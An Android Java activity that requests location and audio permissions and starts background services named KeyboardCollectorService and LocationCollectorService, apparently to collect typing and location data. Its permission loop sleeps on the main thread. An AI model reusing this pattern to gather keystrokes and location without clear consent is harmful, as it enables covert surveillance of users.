package hr.fer;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

import hr.fer.collectors.KeyboardCollectorService;
import hr.fer.collectors.LocationCollectorService;

import hr.fer.keyboard.R;

public class MainActivity extends AppCompatActivity {
    private final static int WAIT_INTERVAL = 5 * 1000; //5 seconds

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ) {
            checkPermission();
        }

        Intent serviceIntent = new Intent(this, KeyboardCollectorService.class);
        startService(serviceIntent);

        Intent serviceIntentLocation = new Intent(this, LocationCollectorService.class);
        startService(serviceIntentLocation);
    }


    public void checkPermission() {
        while(ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED){

            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.RECORD_AUDIO},
                    123);


            try {
                Thread.currentThread().sleep(WAIT_INTERVAL);
            } catch (InterruptedException e) {
            }
        }
    }

}


